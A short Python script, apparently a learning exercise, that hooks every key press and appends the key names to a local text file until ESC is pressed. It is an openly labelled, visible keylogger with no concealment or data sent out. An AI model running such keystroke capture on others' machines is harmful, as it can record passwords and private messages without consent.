import keyboard
import time

#Define a file
saved_krystroke = "C:\\Users\\pushk\\Downloads\\key_log.txt"

def write_key(key):
    with open(saved_krystroke, "a") as f:
        f.write(f'{key.name}\n')

keyboard.on_press(write_key)

print("Keylogger started... Press ESC to stop.")
try:
    while True:
        #Stop the keylogger when 'esc' is pressed
        if keyboard.is_pressed("esc"):
            print("Keylogger stopped.")
            break
        time.sleep(0.1)
except KeyboardInterrupt:

    print("Keylogger interrupted and stopped.")